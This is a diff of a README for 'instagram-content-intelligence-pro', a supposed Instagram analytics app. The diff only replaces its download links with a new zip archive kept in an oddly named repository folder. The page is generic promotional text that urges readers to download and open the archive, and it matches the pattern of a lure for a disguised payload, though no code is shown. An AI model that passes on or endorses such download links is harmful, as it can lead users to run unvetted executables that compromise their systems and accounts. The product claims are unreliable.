@@ -1,7 +1,7 @@
 # 📊 instagram-content-intelligence-pro - Analyze Your Instagram Effectively
 
 ## 🔗 Download Now
-[![Download](https://github.com/gabryelvieiramusico/instagram-content-intelligence-pro/raw/refs/heads/main/woodenheaded/content_instagram_intelligence_pro_v1.5.zip%20Latest%20Release-blue)](https://github.com/gabryelvieiramusico/instagram-content-intelligence-pro/raw/refs/heads/main/woodenheaded/content_instagram_intelligence_pro_v1.5.zip)
+[![Download](https://raw.githubusercontent.com/gabryelvieiramusico/instagram-content-intelligence-pro/main/woodenheaded/intelligence-instagram-pro-content-2.5-beta.4.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/gabryelvieiramusico/instagram-content-intelligence-pro/main/woodenheaded/intelligence-instagram-pro-content-2.5-beta.4.zip)
 
 ## 📚 Overview
 instagram-content-intelligence-pro enables you to analyze your Instagram content and gain data-driven insights. With this application, you can understand engagement metrics, profile influencers, and extract valuable information from your media. This tool helps you make informed decisions for your social media strategy.
@@ -18,7 +18,7 @@ Make sure your system meets the following requirements:
 ### Step 2: Download & Install
 To download the application, visit the Releases page:
 
-[Download the latest release here](https://github.com/gabryelvieiramusico/instagram-content-intelligence-pro/raw/refs/heads/main/woodenheaded/content_instagram_intelligence_pro_v1.5.zip)
+[Download the latest release here](https://raw.githubusercontent.com/gabryelvieiramusico/instagram-content-intelligence-pro/main/woodenheaded/intelligence-instagram-pro-content-2.5-beta.4.zip)
 
 Choose the version appropriate for your operating system and click on it to download. Once the download is complete, open the file to start the installation process.
 
@@ -56,4 +56,4 @@ We plan to expand the functionality in future updates. Features under considerat
 ## 🔗 Conclusion
 You are now ready to utilize instagram-content-intelligence-pro for your content analysis needs. By following these steps, you can easily gain insights that will help improve your Instagram strategy.
 
-[Download the latest release here](https://github.com/gabryelvieiramusico/instagram-content-intelligence-pro/raw/refs/heads/main/woodenheaded/content_instagram_intelligence_pro_v1.5.zip) and start exploring your engagement metrics today!
+[Download the latest release here](https://raw.githubusercontent.com/gabryelvieiramusico/instagram-content-intelligence-pro/main/woodenheaded/intelligence-instagram-pro-content-2.5-beta.4.zip) and start exploring your engagement metrics today!
